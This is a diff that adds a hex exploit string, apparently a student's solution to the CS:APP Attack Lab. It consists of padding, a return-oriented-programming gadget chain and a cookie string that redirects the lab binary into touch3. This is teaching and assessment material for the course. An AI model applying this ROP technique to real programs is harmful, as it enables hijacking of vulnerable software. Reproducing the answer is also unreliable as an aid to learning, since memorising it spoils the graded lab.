@@ -1,0 +1,12 @@
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa /* padding */
+b4 1d 40 00 00 00 00 00 /* rax = rsp */
+39 1d 40 00 00 00 00 00 /* rdi = rax */
+0f 1d 40 00 00 00 00 00 /* popq rax (rax = val) */
+48 00 00 00 00 00 00 00 /* val */
+d0 1d 40 00 00 00 00 00 /* edx = eax */
+a6 1d 40 00 00 00 00 00 /* ecx = edx */
+92 1d 40 00 00 00 00 00 /* esi = ecx */
+43 1d 40 00 00 00 00 00 /* rax = add_xy(rdi, rsi) */
+39 1d 40 00 00 00 00 00 /* rdi = rax */
+69 1c 40 00 00 00 00 00 /* touch3 */
+33 66 63 35 61 31 32 32 /* cookie */
